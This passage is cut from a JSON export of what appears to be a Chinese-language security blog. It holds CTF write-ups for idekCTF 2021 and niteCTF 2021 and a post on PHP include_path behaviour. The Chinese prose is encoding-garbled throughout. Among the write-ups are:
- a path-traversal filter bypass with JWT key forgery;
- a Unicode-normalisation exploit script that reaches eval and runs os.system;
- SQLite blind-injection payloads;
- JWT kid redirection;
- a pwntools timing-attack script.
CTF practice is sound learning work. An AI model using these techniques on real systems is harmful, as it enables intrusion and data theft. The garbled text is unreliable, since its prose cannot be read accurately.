çš„æ–‡ä»¶åæ˜¯ç›´æ¥æ‹¼åœ¨os.path.joinä¸­çš„ï¼Œè¿‡æ»¤äº†../ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨..././çš„æ–¹å¼æ¥ç»•è¿‡ï¼ˆè¿‡æ»¤ä¹‹åæ‹¼èµ·æ¥æ­£å¥½æ˜¯../ï¼Œå¯ä»¥åšåˆ°è·¯å¾„ç©¿è¶Šï¼Œä¸è¿‡æ–‡ä»¶åè¿˜ä¼šæœ‰ä¸€ä¸ª_ä¸‹åˆ’çº¿ï¼Œæˆ‘ä»¬çš„ç©¿è¶Šç›®æ ‡è·¯å¾„éœ€è¦æœ¬èº«å°±å¸¦æœ‰ä¸‹åˆ’çº¿ä½¿å…¶ä¸ç©¿å¸®ï¼Œæˆ‘ä»¬é€‰æ‹©/proc/self/map_filesï¼ˆé€‰æ‹©/usr/local/lib/python3.8/http/__pycache__ä¹Ÿæ˜¯å¯ä»¥æ»´ï¼‰\néªŒè¯cookieæ˜¯å¦åˆæ³•çš„æ—¶å€™æ˜¯åœ¨æ–‡ä»¶ä¸Šä¼ ä¹‹åçš„äº‹æƒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åšpublic.key\nimage_data = uploaded_file.stream.read() image_md5 = hashlib.md5(image_data).hexdigest() image_path = f\u0026#39;uploads/{image_md5}.jpeg\u0026#39; æˆ‘ä»¬çš„å›¾ç‰‡è·¯å¾„å°±åœ¨/app/uploads/{image_md5}.jpegä¸‹ï¼Œæ˜¯å›ºå®šå¯æŒ‡å‘çš„ï¼ˆç»å¯¹è·¯å¾„ï¼‰\næ‰€ä»¥æ•´ä¸ªæ€è·¯å°±æ˜¯ï¼šå…ˆä¸Šä¼ ä¸€ä¸ªå«æœ‰å…¬é’¥çš„jpegå›¾ç‰‡ï¼Œä¹‹åä¸Šä¼ ä¸€ä¸ªæ­£å¸¸çš„jpgå›¾ç‰‡ï¼Œè¿™æ¬¡è¦ä¿®æ”¹æ–‡ä»¶å\n..././..././..././..././..././proc/self/map å†é…åˆæˆ‘ä»¬çš„jwtï¼Œå…¶ä¸­çš„usernameéƒ¨åˆ†å°±å¾—æ˜¯è¿™æ ·\nfiles/../../../app/flag.txt pubkeyéƒ¨åˆ†æŒ‡å‘æˆ‘ä»¬å›¾ç‰‡çš„ç»å¯¹è·¯å¾„\n/app/uploads/{image_md5}.jpeg è¿™æ ·ï¼Œä¸Šä¼ ä¹‹åç»è¿‡æ‹¼æ¥ æœ€ç»ˆè·¯å¾„å°†ä¼šæ˜¯\noutput/../../../../../proc/self/map_files/../../../app/flag.txt è¿™æ ·åœ¨ä¸‹è½½æ—¶å°±åšåˆ°äº†ä»»æ„æ–‡ä»¶è¯»å–ï¼Œå¾—åˆ°flag\nâ€”â€”â€”â€”è‚¥è‚ å·§å¦™çš„æ€è·¯äº†ï¼ä¹‹å‰åšjwtç›¸å…³çš„é¢˜å›ºå®šå¥—è·¯éƒ½æ˜¯sstiè·å–keyï¼Œä¼ªé€ cookieå°±å¥½äº†ï¼Œè€Œè¿™ä¸ªè·Ÿæ–‡ä»¶è¿˜æœ‰ç»“åˆï¼Œä¹‹å‰æ²¡è§è¿‡\nâ€”â€”â€”â€”æœ‰ä¸€ä¸ªæˆ‘å¿½ç•¥çš„ç‚¹ï¼šç”±äºæ˜¯å…ˆä¿å­˜æ–‡ä»¶å†æ ¡éªŒ æ‰€ä»¥ä¸ç”¨ç®¡ä¼ ä¸Šå»æŠ¥ä¸æŠ¥é”™éƒ½ä¼šè¢«ç•™å­˜ï¼Œç„¶é¹…ç„¶é¹…ï¼Œéƒ½æœ‰äº†embed_fileå‡½æ•°æ¥ç›´æ¥è·å¾—éšå†™çš„æ–‡ä»¶äº†ã€‚ã€‚ã€‚ã€‚ğŸ˜…å°ä¸‘ç«Ÿæ˜¯æˆ‘è‡ªå·±\nå‚è€ƒï¼šwp\nMisc/Profanity Check once tried to filter messages for profanity using a discord bot. I failed. nc profanity-check.chal.idek.team 1337\nhttps://ctf.idek.team/handouts/misc/ProfanityCheck/profanity_check.py\n#/usr/bin/env python3 from unicodedata import normalize import random i = input(\u0026#34;\u0026gt;\u0026gt;\u0026gt; \u0026#34;) for n in range(10000): if random.choice(\u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34;) in i: print(\u0026#34;Profanity detected. Exiting.\u0026#34;) exit(0) i = normalize(\u0026#34;NFC\u0026#34;, i) blacklist = [\u0026#34;__\u0026#34;, \u0026#34;()\u0026#34;, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;[\u0026#34;, \u0026#34;]\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;:\u0026#34;, \u0026#34;!\u0026#34;, \u0026#34;@\u0026#34;, \u0026#34;#\u0026#34;, \u0026#34;$\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;^\u0026#34;, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;,\u0026#34;, \u0026#34;class\u0026#34;, \u0026#34;mro\u0026#34;, \u0026#34;sub\u0026#34;, \u0026#34;glob\u0026#34;] for n in blacklist: if n in i: print(\u0026#34;Profanity detected. Exiting.\u0026#34;) exit(0) eval(i) å¾ˆæ˜æ˜¾éœ€è¦ç»•è¿‡è¿™ä¸ªwafæ¥rceï¼Œæ²¡æœ‰è¢«è¿‡æ»¤çš„æœ‰å•åŒå¼•å·å’Œæ•°å­—ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å…«è¿›åˆ¶ï¼Œæ¯”å¦‚è¿™æ ·\neval(\u0026#39;\\150\\145\\154\\160\\50\\51\\40\u0026#39;) # eval(help()) ä½†æ˜¯è¿™é‡Œç”¨8è¿›åˆ¶å¹¶ä¸å¯ä»¥è¢«evalæ‰§è¡Œï¼Œå› ä¸ºæœ¬åœ°æ˜¯è¿™æ ·çš„\nä½†æ˜¯é€šè¿‡inputä¼ è¿‡å»ä¹‹åä¼šè¢«è½¬ä¹‰ï¼Œå†åŠ ä¸€ä¸ªåæ–œæ \né‚£è‚¯å®šä¼šæƒ³å†åŠ åæ–œæ å‘—ï¼Ÿ\næœ¬æ¥æˆ‘ä»¬çš„\\åæ–œæ æ˜¯ç”¨æ¥åš8è¿›åˆ¶çš„å¼•å¯¼å­—ç¬¦çš„ï¼Œç»“æœè¿™æ ·å¤„ç†ä¼šå˜æˆçº¯çº¯çš„å­—ç¬¦ä¸²ï¼Œè¶Šæè¶Šé»‘äº†\næ˜¾ç„¶è¿™æ ·æ˜¯æ‰§è¡Œä¸äº†å‘½ä»¤çš„ï¼ˆä¹Ÿå¯èƒ½æ˜¯æˆ‘çŸ¥é“çš„å¤ªå°‘äº†ï¼Œæ¬¢è¿å„ä½å¸ˆå‚…åˆ†äº«ï¼‰ï¼Œæˆ‘ä»¬è¿™é‡Œç”¨unicodeçš„å°trick\nåšé¢˜å¤šä¸€ç‚¹çš„å¸ˆå‚…åº”è¯¥å°±èƒ½æ˜ç™½å•¥æ„æ€äº†ï¼Œä¸€ä¸ªå¸¸è€ƒçš„ç‚¹æ˜¯æ³¨å†ŒÂªdminçš„è´¦æˆ·æ¥ä¼ªé€ adminï¼Œè¿™é‡Œä¹Ÿæ˜¯åŒç†ï¼›ä»£ç ä¸­æœ‰ä¸€ä¸ªç¼ºé™·ï¼šå…ˆè¿‡æ»¤é»‘åå•å­—ç¬¦å†è¿›è¡Œnormalize()ï¼Œè¿™ä¼šå¯¼è‡´ç‰¹æ®Šçš„unicodeå­—ç¬¦ä¼šå…ˆé¡ºåˆ©é€šè¿‡è¿‡æ»¤ï¼Œå†è¢«normalize()è½¬ä¸ºæ­£å¸¸å­—ç¬¦ï¼Œæœ€ç»ˆå‘½ä»¤æ‰§è¡Œ\nè¿™é‡Œæ˜¯ä¸ªexp\n#!/usr/bin/env python3 letters = [\u0026#39;Âª\u0026#39;, \u0026#39;áµ‡\u0026#39;, \u0026#39;á¶œ\u0026#39;, \u0026#39;áµˆ\u0026#39;, \u0026#39;áµ‰\u0026#39;, \u0026#39;á¶ \u0026#39;, \u0026#39;áµ\u0026#39;, \u0026#39;Ê°\u0026#39;, \u0026#39;â±\u0026#39;, \u0026#39;Ê²\u0026#39;, \u0026#39;áµ\u0026#39;, \u0026#39;Ë¡\u0026#39;, \u0026#39;áµ\u0026#39;, \u0026#39;â¿\u0026#39;, \u0026#39;Âº\u0026#39;, \u0026#39;áµ–\u0026#39;, \u0026#39;ï½‘\u0026#39;, \u0026#39;Ê³\u0026#39;, \u0026#39;Ë¢\u0026#39;, \u0026#39;â‚œ\u0026#39;, \u0026#39;áµ˜\u0026#39;, \u0026#39;áµ›\u0026#39;, \u0026#39;Ê·\u0026#39;, \u0026#39;Ë£\u0026#39;, \u0026#39;Ê¸\u0026#39;, \u0026#39;á¶»\u0026#39;] # payload = \u0026#34;print(__import__(\u0026#39;os\u0026#39;).system(\u0026#39;ls\u0026#39;))\u0026#34; payload = \u0026#34;print(__import__(\u0026#39;os\u0026#39;).system(\u0026#39;cat flag.txt\u0026#39;))\u0026#34; exploit = \u0026#34;áµ‰áµ›ÂªË¡(\u0026#39;\u0026#39;\u0026#34; for char in payload: exploit += f\u0026#34;+á¶œÊ°Ê³({ord(char)})\u0026#34; exploit += \u0026#34;)\u0026#34; print(exploit) # áµ‰áµ›ÂªË¡(\u0026#39;\u0026#39;+á¶œÊ°Ê³(112)+á¶œÊ°Ê³(114)+á¶œÊ°Ê³(105)+á¶œÊ°Ê³(110)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(40)+á¶œÊ°Ê³(95)+á¶œÊ°Ê³(95)+á¶œÊ°Ê³(105)+á¶œÊ°Ê³(109)+á¶œÊ°Ê³(112)+á¶œÊ°Ê³(111)+á¶œÊ°Ê³(114)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(95)+á¶œÊ°Ê³(95)+á¶œÊ°Ê³(40)+á¶œÊ°Ê³(39)+á¶œÊ°Ê³(111)+á¶œÊ°Ê³(115)+á¶œÊ°Ê³(39)+á¶œÊ°Ê³(41)+á¶œÊ°Ê³(46)+á¶œÊ°Ê³(115)+á¶œÊ°Ê³(121)+á¶œÊ°Ê³(115)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(101)+á¶œÊ°Ê³(109)+á¶œÊ°Ê³(40)+á¶œÊ°Ê³(39)+á¶œÊ°Ê³(99)+á¶œÊ°Ê³(97)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(32)+á¶œÊ°Ê³(102)+á¶œÊ°Ê³(108)+á¶œÊ°Ê³(97)+á¶œÊ°Ê³(103)+á¶œÊ°Ê³(46)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(120)+á¶œÊ°Ê³(116)+á¶œÊ°Ê³(39)+á¶œÊ°Ê³(41)+á¶œÊ°Ê³(41)) æ›´å¤šçš„ç›¸ä¼¼unicodeå¯ä»¥å‚è€ƒè¿™ä¸ªç½‘ç«™-\u0026gt;https://www.compart.com/en/unicode\n# è¿™æ ·çš„ä¹Ÿå¯ä»¥æ ï½ï½’ï½‰ï½ï½”(ï½ï½ï½…ï½(ï½ƒï½ˆï½’(102) + ï½ƒï½ˆï½’(108) + ï½ƒï½ˆï½’(97) + ï½ƒï½ˆï½’(103) + ï½ƒï½ˆï½’(46) + ï½ƒï½ˆï½’(116) + ï½ƒï½ˆï½’(120) + ï½ƒï½ˆï½’(116)).ï½’ï½…ï½ï½„(115)) å‚è€ƒï¼šWAF Bypassing with Unicode Compatibility\nå°‘äº†ä¸‰é“jsçš„é¢˜ï¼Œæˆ‘çš„ï¼Œä¸‹æ¬¡ä¸€å®šï¼\nç°åœ¨å°‘2é“äº†\nå¦å¤–steghide-as-a-serviceè¿™é“é¢˜æ„Ÿè°¢å¸ˆå‚…çš„å¸®åŠ©ï¼ˆæˆ‘è‡ªå·±å¡åˆ°ä¸€ä¸ªå¾ˆè ¢çš„åœ°æ–¹äº†\næœ€è¿‘æœ‰ç‚¹æ‘†çƒ‚ï¼Œå±äºæ˜¯æ˜¥å›°ç§‹ä¹é‡Œé¢çš„å†¬çœ äº†ï¼Œç¡ä¸é†’çš„å†¬ä¸‰æœˆå•Šå•Šå•Šå•Šå•Šå•Š\nåŒ—äº¬å†¬è‡³çš„æ—¶å€™æ—¥å‡ºæ—¥è½ä¹‹é—´åªæœ‰9ä¸ªåŠå°æ—¶ä¸åˆ°ï¼Œè°å¬äº†ä¸æƒ³ç¡æ­»è¿‡å»ï¼ˆ\n","date":"2021-12-15T21:11:49+08:00","permalink":"https://amiaaaz.github.io/2021/12/15/idekctf2021-wp/","section":"posts","tags":["wp"],"title":"idekCTF2021 Wp"},{"categories":["NOTES\u0026SUMMARY"],"contents":"ä¹‹å‰åšé¢˜é‡åˆ°åæŸ¥äº†ä¸€ä¸‹ç›¸å…³æ–‡ç« ï¼Œè§‰å¾—å¾ˆé€‚åˆå‡ºé¢˜ï¼Œä½†æ˜¯æ„Ÿè§‰ä¸èƒ½ä¸ºäº†è€ƒè€Œè€ƒï¼Œä¹Ÿå°±å¤±å»äº†CTFçš„æ„ä¹‰ï¼Œæ‰€ä»¥è¿˜ä¸å¦‚å…ˆå‘å‡ºæ¥è¿™ä¸€ç¯‡\nï¼ˆåˆ«éª‚äº† å°±æ˜¯æ‡’\nå…³äºinclude/require(_once)() è¿™å‡ ä¸ªå‡½æ•°åº”è¯¥éƒ½ä¸é™Œç”Ÿï¼ˆè¿˜åº”è¯¥å†åŠ ä¸Šinclude_pathï¼‰ï¼Œå¹²çš„æ˜¯æ–‡ä»¶åŒ…å«çš„äº‹ï¼›å…ˆæŒ‰ç…§ç»™å®šå‚æ•°å¯»æ‰¾è·¯å¾„ï¼ˆå½“å®šä¹‰äº†è·¯å¾„åˆ™ä¼šå®Œå…¨å¿½ç•¥include_pathï¼‰ï¼Œå¦‚æœåªæœ‰æ–‡ä»¶ååˆ™æŒ‰ç…§include_pathçš„æŒ‡å®šç›®å½•å¯»æ‰¾ï¼Œå¦‚æœè¿˜æ²¡æ‰¾åˆ°åˆ™ä¼šåœ¨è°ƒç”¨è„šæœ¬æ–‡ä»¶æ‰€åœ¨çš„ç›®å½•å’Œå½“å‰å·¥ä½œç›®å½•ä¸‹å¯»æ‰¾ï¼›ä¸‹é¢è¯´å‡ ä¸ªå°ç‚¹\né¦–å…ˆæ˜¯requireå’Œincludeçš„åŒºåˆ«åœ¨äºrequireåœ¨å‡ºé”™æ—¶ä¼šäº§ç”ŸE_COMPILE_ERRORçº§åˆ«çš„é”™è¯¯ï¼Œè„šæœ¬å°†ä¸­æ­¢è¿è¡Œï¼Œè€Œincludeåªä¼šäº§ç”Ÿè­¦å‘ŠE_WARNINGï¼Œä¸å½±å“ç»§ç»­é¡¶ç€é”™è¯¯ç»§ç»­æ‰§è¡Œè„šæœ¬ï¼ˆåšé¢˜å¾ˆå¸¸è§è¿™ä¸ª æ— æ•°çš„æŠ¥é”™ä¸‹é¢æœ‰æ­£å¸¸çš„å›æ˜¾ï¼‰\nå¦ä¸€ä¸ªåŒºåˆ«åœ¨äºrequireæ˜¯æ— æ¡ä»¶åŒ…å«å‡½æ•°ï¼Œå³ç¨‹åºæ‰§è¡Œå‰å°±ä¼šå°†æ–‡ä»¶å†…å®¹ä»¥æ–‡æœ¬æ›¿æ¢çš„å½¢å¼å¼•å…¥ï¼ˆæ‰€ä»¥è¿™ä»½æ–‡ä»¶åªè¢«å¤„ç†ä¸€æ¬¡ï¼‰ï¼Œè®©å®ƒå˜ä¸ºphpè„šæœ¬çš„ä¸€éƒ¨åˆ†ï¼ˆæ‰€ä»¥é€šå¸¸æ”¾åœ¨phpæ–‡ä»¶çš„æœ€å‰é¢ï¼‰ï¼›includeåˆ™æ˜¯æœ‰æ¡ä»¶åŒ…å«å‡½æ•°ï¼Œç”¨åˆ°æ—¶æ‰è¢«åŠ è½½ï¼Œä¸”æ¯æ¬¡æ‰§è¡Œæ–‡ä»¶æ—¶éƒ½è¦è¿›è¡Œè¯»å–å’Œè¯„ä¼°\nå½“phpé‡åˆ°require/include(_once)å‡½æ•°æ—¶ï¼Œå¦‚æœç»™å®šçš„å‚æ•°æ˜¯ä¸ªç»å¯¹è·¯å¾„åˆ™ç›´æ¥å¼•å…¥ï¼Œä½†å¦‚æœç»™çš„æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™è¦è¿›å…¥å¦å¤–çš„é€»è¾‘ï¼ˆç»è¿‡å¤šæ¬¡è°ƒç”¨ï¼Œå®å±•å¼€åè¿›å…¥_php_stream_fopen_with_pathï¼‰å¯»æ‰¾æ­¤æ–‡ä»¶ï¼›åœ¨_php_stream_fopen_with_pathä¼šæ ¹æ®include_pathå’Œå½“å‰æ‰§è¡Œæ–‡ä»¶çš„pathç»„æˆä¸€ä¸ªå¾…é€‰çš„ç›®å½•åˆ—è¡¨ï¼Œç„¶åä»åˆ—è¡¨å¤´éƒ¨å¼€å§‹æ ¹æ®DEFAULT_DIR_SEPARATORï¼ˆlinuxä¸‹é»˜è®¤ä¸º: winä¸º;ï¼‰å–å‡ºè·¯å¾„ï¼Œç„¶åæ‹¼ä¸Šæ–‡ä»¶åï¼Œå¦‚æœæˆåŠŸåˆ™è¿”å›ï¼Œå¤±è´¥åˆ™ç»§ç»­ä¸‹ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„ï¼ˆæ‰€ä»¥å¦‚æœæœ‰é‡åçš„å°±å¥½ç©äº†ï¼‰\nå‡ ä¸ªå¥½ç©çš„å°æ —å­ è¿™é‡Œä¸¾ä¸€ä¸ªå°æ —å­ï¼Œæ–‡ä»¶ç»“æ„å’Œå†…å®¹å¦‚ä¸‹ï¼ˆæ³¨æ„è¿™é‡Œinclude_pathçš„å†™æ³•!!!ä¸ä»…æœ‰path_to_subdirè¿˜æœ‰:åˆ†éš”ç¬¦å‰é¢ä»£è¡¨çš„current_dir!!!ï¼‰\nåœ¨ä¸åŒçš„æƒ…å†µä¸‹è¿è¡Œçœ‹çœ‹æ•ˆæœ\nåœ¨rootç›®å½•ä¸‹æ‰§è¡Œæ—¶ï¼Œç›´æ¥æ ¹æ®1.phpçš„include_pathå¯»æ‰¾2.phpï¼Œè€Œ2.phpä¸­å¹¶æ²¡æœ‰è®¾ç½®include_pathï¼Œé‚£ä¹ˆè·¯å¾„å°±å˜æˆäº†åˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„ å³\u0026quot;.\u0026quot;ï¼Œè€Œå½“å‰å·¥ä½œç›®å½•æ˜¯rootï¼Œæ‰€ä»¥å°±æ˜¯/root/3.phpçš„è¾“å‡º\næ¢åˆ°subdirç›®å½•ä¸‹æ‰§è¡Œ1.phpæ—¶ï¼Œåˆ—è¡¨ä¸­ç¬¬ä¸€ä¸ªå¾…é€‰æ‹©è·¯å¾„\u0026quot;.\u0026quot;å˜ä¸ºäº†subdirï¼Œè‡ªç„¶è¾“å‡ºå˜ä¸ºäº†/root/subdir/3.phpçš„è¾“å‡º\nç°åœ¨æˆ‘ä»¬æŠŠinclude_pathä»…ä¿ç•™path_to_subdirï¼Œç»§ç»­ä¸Šé¢çš„æŒ‡ä»¤è¿è¡Œä¸€ä¸‹\né‚£ä¸ç®¡å½“å‰è·¯å¾„æ˜¯ä»€ä¹ˆéƒ½ä¼šå¾—åˆ°subdirçš„è¾“å‡º\nå†è¿›ä¸€æ­¥ï¼Œåœ¨2.phpä¸­åŠé“æ¸…ç©ºinclude_pathä¼šæ€ä¹ˆæ ·å‘¢\næˆ‘ä»¬å‘ç°è·Ÿä¸Šé¢ç»“æœä¸€æ ·ï¼Œä½†æ˜¯è¿™é‡Œçš„é€»è¾‘å´æœ‰å·®å¼‚ï¼š2.phpä¸­æ¸…ç©ºinclude_pathåå†åŒ…å«æ–‡ä»¶å°†ä¼šè‡ªåŠ¨å˜ä¸ºcurrent_pathçš„è·¯å¾„ï¼Œè€Œ2.phpåœ¨/root/subdirä¸‹ï¼Œæ‰€ä»¥å›æ˜¾å’Œ2.phpçš„è·¯å¾„ä¿æŒä¸€è‡´\nå†å†è¿›ä¸€æ­¥\nè¯¶ï¼Œå¯ä»¥çœ‹åˆ°ç”±äºè¿™é‡Œä¸¤æ¬¡éƒ½ç”¨åˆ°äº†ç›¸å¯¹ç›®å½•çš„\u0026quot;./\u0026quot;è¿›è¡Œå¼•ç”¨ï¼Œæ‰€ä»¥åœ¨/rootç›®å½•ä¸‹è¿è¡Œå¾ˆé¡ºç•…ï¼Œè€Œ/root/subdirç›®å½•ä¸‹ç”±äºä¸ä¼šå†å­˜åœ¨./subdir/2.phpï¼Œæ‰€ä»¥æŠ¥é”™é€€å‡º\nä½¿ç”¨æ³¨æ„ åœ¨ä½¿ç”¨include_pathå’Œç›¸å¯¹è·¯å¾„æ—¶ä¼šå½±å“æ€§èƒ½ï¼Œæ‰€ä»¥æœ€å¥½ç”¨ç»å¯¹è·¯å¾„ ç›®å½•ç›¸å¯¹è·¯å¾„çš„basediræ°¸è¿œæ˜¯å½“å‰å·¥ä½œè·¯å¾„ å¯ä»¥é€šè¿‡__DIR__æ¥è·å¾—ç»å¯¹è·¯å¾„ å»ºè®®å°‘ä½¿ç”¨include/require_once *å†™çš„ä¸å…¨é¢ï¼Œè¿˜æœ‰ä¸€éƒ¨åˆ†éœ€è¦è¡¥å…… å…ˆé¸½äº†ï¼Œé‡åˆ°é¢˜æˆ–è€…å…·ä½“çš„åº”ç”¨åœºæ™¯æˆ‘è¡¥å……ä¸Šæ¥\nä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ æ·±å…¥ç†è§£PHPä¹‹require/includeé¡ºåº\n","date":"2021-12-13T01:12:22+08:00","permalink":"https://amiaaaz.github.io/2021/12/13/smth-about-include-require-in-php/","section":"posts","tags":["PHP","æ–‡ä»¶åŒ…å«"],"title":"å…³äºinclude/require(_once)çš„æ˜“æ··æ·†ç‚¹"},{"categories":["CTF"],"contents":"http://ctf.cryptonite.team/challenges\nhttps://ctftime.org/event/1449\nWeb/welcome to niteCTF welcome baby\nGo to the https://capturetheflag.cryptonite.team and copy the flag, it\u0026rsquo;s that simple!\nf12ç»™æ•´äº†ä¸ªb64ï¼Œè§£ç ä¹‹åæ˜¯Cryptoniteï¼Œå¾ˆé—æ†¾å®ƒå¹¶ä¸æ˜¯flag\næŠ“åŒ…åçœ‹åˆ°æœ‰jsfuck\n\u0026lsquo;Organized by Cryptonite Manipal\u0026rsquo;\nä¹Ÿä¸æ˜¯flagï¼Œå°±å¾ˆé¸¡è´¼ï¼Œåœ¨å¦ä¸€ä¸ªjsæ–‡ä»¶ä¸­\nWeb/BATCHEST My friend just opened a new zoo, so I made him a site to check if his zoo has those animals. https://blindsqli-web.chall.cryptonite.team/\nAuthor: SPEED\næŠŠç›²æ³¨çš„æç¤ºå†™åˆ°urlä¸­äº†\nå®ƒçš„å›æ˜¾åªæœ‰æœ‰å’Œæ²¡æœ‰ä¸¤ç§ï¼Œæ‰€ä»¥éœ€è¦char-by-charç±»å‹çš„ç›²æ³¨\nä¸è¿‡è¿™é‡Œè¦æ³¨æ„lion'or '1' #è¿”å›äº†500ï¼Œè€Œlion'or '1' -- è¿”å›æ­£å¸¸ï¼Œè¯´æ˜è¿™é‡Œçš„æ•°æ®åº“æ˜¯sqliteï¼Œç”¨çš„æ˜¯sqlite_masteræ¥è·å–ä¿¡æ¯\n# è„šæœ¬æˆ‘ä¹‹åå®Œå–„ä¸€ä¸‹ # ä¹‹å‰å†™äº†ä¸€ä¸ªé€šç”¨çš„char-by-char-sqliçš„æ¨¡æ¿ # ä½†æ˜¯å‘ç°è€¦åˆæ€§å¤ªé«˜äº† # è¿˜æ˜¯æŒ‰åŠŸèƒ½åˆ†å¼€å‡½æ•°å†™æ¯”è¾ƒå¥½ # å¾…å®Œå–„ä¸­XD # ç„¶åçœ‹åˆ°äº†ä¸€ä¸ªæˆªå›¾ # å¯¹å“¦ ä»–å¦ˆçš„ä¸ºä»€ä¹ˆç›²æ³¨è¿™ç§ä¸œè¥¿ä¸ç›´æ¥ç”¨burp-intruderå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ # ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ # çªç„¶å‘ç°äº†ä¸€ä¸ªåç‚¹ # è¿˜å†™ä¸ªpçš„è„šæœ¬ ç”¨burp # å¼€ç©ç¬‘çš„ å„æœ‰å„çš„åº”ç”¨åœºæ™¯ Web/JWT Jason likes cookies but he is diabetic. So his mom stored them away somewhere safe. Can you help him find the path that leads to the solution for his hungry desires?\nhttps://jwt-web.challenge.cryptonite.team http://35.201.116.81/\nAuthor: LatinArceus\næˆ‘ä»¬å¾—ä¼ªé€ ä¸€ä¸ª\u0026quot;admin_cap\u0026quot;:\u0026quot;true\u0026quot;çš„cookieï¼Œæ³¨æ„åˆ°è¿™é‡Œçš„kidæŒ‡å‘çš„æ˜¯æœåŠ¡å™¨æœ¬åœ°çš„secret.txtï¼Œé‚£æˆ‘ä»¬åªéœ€è¦æŠŠå®ƒæŒ‡å‘æˆ‘ä»¬è‡ªå·±çš„secret.txtå°±å¥½äº†\nnite{R3diR3ct10n_c4n_b3_4_vuLn_t0O}\nMisc/Let\u0026rsquo;s be Artistic We have received some encoded message from an art gallery. Can you trace it back to the flag? The flag is all uppercase. Wrap it in flag format nite{}\n87yhnmkj 5rfvbnju76 5rfvbnju76 tyjnbg tyjnbg 5rfc6ygn cft6yhn efvgyjmko 9ikm xdr5thnji9 87yhnmkj é”®ç›˜æ‰“å­—çš„è½¨è¿¹ ï¼ˆåœ¨é”®ç›˜ä¸Šæ’’æŠŠç±³ é¸¡è·‘çš„è·¯çº¿\nnite{GOODDRAWING}\nMisc/Slow Passwords We made ourselves super secure by a random password authentication every time the connection is established. Is it really that secure?\nnc slow-passwords.challenge.cryptonite.team 1337\nåˆšå¼€å§‹éƒ½æ²¡æ˜ç™½å•¥æ„æ€ï¼Œçœ‹äº†wpçŸ¥é“äº†\næ¯æ¬¡è¿æ¥æœåŠ¡å™¨ç”Ÿæˆä¸åŒçš„passwdï¼Œå…è®¸æ¯æ¬¡1ä¸ªå­—ç¬¦è¾“3æ¬¡ï¼Œä½†æ˜¯è¾“å…¥ä¸åŒå­—ç¬¦çš„å“åº”æ—¶é—´æ˜¯ä¸åŒçš„ï¼Œæœ‰çš„é•¿æœ‰çš„çŸ­ï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾ä¸ªå‚ç…§å­—ç¬¦ï¼ˆæ¯”å¦‚'a'ï¼‰ï¼Œé€šè¿‡å“åº”æ—¶é—´è·Ÿ'a'æ‰€èŠ±çš„æ—¶é—´çš„åç§»é‡æ¥åˆ¤æ–­æ˜¯å¦æ­£ç¡®ï¼ˆç›¸å½“äºä¸€ç§å˜ç›¸çš„æ—¶é—´ç›²æ³¨äº†ï¼‰ï¼Œä»è€Œè®¡ç®—å‡ºä¸‹ä¸€ä¸ªè¯¥è¾“å…¥çš„å­—ç¬¦\nfrom pwn import * from time import time p = remote(\u0026#34;slow-passwords.challenge.cryptonite.team\u0026#34;, 1337) print(p.recvlines(5)) curr = p.recvline() print(\u0026#39;start:\u0026#39;, curr) count = 0 while count \u0026lt; 11: curr = \u0026#39;a\u0026#39; p.sendline(b\u0026#39;a\u0026#39;) print(p.recvline()) start = time() print(p.recvline()) end = time() offset = round(end - start) print(\u0026#34;offset:\u0026#34;, offset) next = bytes(chr(ord(\u0026#39;a\u0026#39;) + offset), \u0026#39;utf-8\u0026#39;) p.sendline(next) print(p.recvline()) print(p.recvline()) count += 1 p.close() å¾ˆå·§å¦™çš„ç”¨æ³•ï¼è¿™ä¸ªæ•…äº‹å‘Šè¯‰æˆ‘ä»¬char-by-charç±»å‹çš„ç›²æ³¨çœŸçš„æ˜¯åœ¨ä»¥å„ç§å„æ ·çš„å½¢å¼å››å¤„å¼€èŠ±ï¼Œåœ¨å¾ˆå¤šåœºåˆéƒ½èƒ½ç”¨çš„ä¸Š\nå‚è€ƒï¼šwp\næœ€è¿‘åˆ·é¢˜åˆ°buuojç¬¬7é¡µäº†ï¼Œå­¦æ ¡ä¹Ÿåˆ°ç¬¬15å‘¨çš„æ•™å­¦å‘¨äº†ï¼Œè¿™å‘¨è¿˜æœ‰å››çº§ï¼Œæ•´ä¸ªäººï¼Œæœ‰ç‚¹éš¾é¡¶çš„\næ‰€ä»¥ï¼æˆ‘é€‰æ‹©å½“ä¸€åªé¸µé¸Ÿï¼Œæœ¬ç€ï¼šè½¦åˆ°å±±å‰å¿…æœ‰è·¯ï¼Œèˆ¹åˆ°æ¡¥å¤´è‡ªç„¶ç›´çš„æ€åº¦è¿æ¥å¯’å‡å‰è¿™æ®µæ—¶é—´ï¼\nå¤ªå¤šçš„flagå°±ä¸ç«‹äº†ï¼Œç«‹å¿ƒé‡Œäº†\n","date":"2021-12-12T23:12:52+08:00","permalink":"https://amiaaaz.github.io/2021/12/12/nitectf2021-wp/","section":"posts","tags":["wp"],"title":"niteCTF2021 